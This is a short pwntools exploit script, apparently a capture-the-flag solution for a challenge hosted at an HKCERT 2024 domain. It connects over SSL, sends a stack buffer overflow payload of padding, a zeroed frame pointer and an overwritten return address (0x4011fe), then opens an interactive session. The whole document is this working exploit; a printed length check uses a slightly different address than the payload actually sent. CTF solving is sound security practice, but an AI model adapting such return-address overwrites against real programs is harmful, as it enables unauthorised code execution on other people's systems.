from pwn import *

pr = remote("c64-chatggt.hkcert24.pwnable.hk", 1337,ssl=True) 
print(len(b'aaaa'*64+p64(0)+p64(0x4011fa)))
pr.sendline(b'aaaa'*64+p64(0)+p64(0x4011fe))
pr.interactive()